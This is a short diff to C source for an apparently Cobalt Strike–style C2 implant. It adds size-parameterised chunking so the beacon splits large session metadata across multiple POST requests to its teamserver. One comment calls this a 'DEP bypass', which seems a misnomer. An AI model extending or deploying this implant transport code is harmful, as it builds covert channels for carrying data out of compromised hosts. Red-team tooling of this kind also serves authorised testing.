@@ -92,9 +92,21 @@ void command_shell_post(char * buffer, int length, int type, BOOL sendNow);
  * for sending session metadata length chunks via Malleable C2.
  */
 void command_shell_chunk(char * buffer, int length, int type) {
-	int     chunk = setting_int(SETTING_C2_CHUNK_POST);
+	command_shell_chunk_sized(buffer, length, type, setting_int(SETTING_C2_CHUNK_POST));
+}
+
+/* C-57: official client_max_post_post_size semantics - an oversized single
+ * frame is chunked into multiple <= cap POST requests (DEP bypass), never
+ * silently dropped. Same chunk protocol as the chunked-GET carrier; the TS
+ * reassembles CHUNK_ALLOCATE/CHUNK_SEND series regardless of transport. */
+void command_shell_chunk_sized(char * buffer, int length, int type, int chunk) {
 	int     sent = 0;
 	formatp meta;
+
+	/* floor: the initial package carries 8B of framing, and chunk+crypto
+	 * overhead should stay metadata-sized; official value floor is 1024 */
+	if (chunk < 128)
+		chunk = 128;
 
 	/* initialize our metadata package */
 	bformat_init(&meta, chunk * 2);
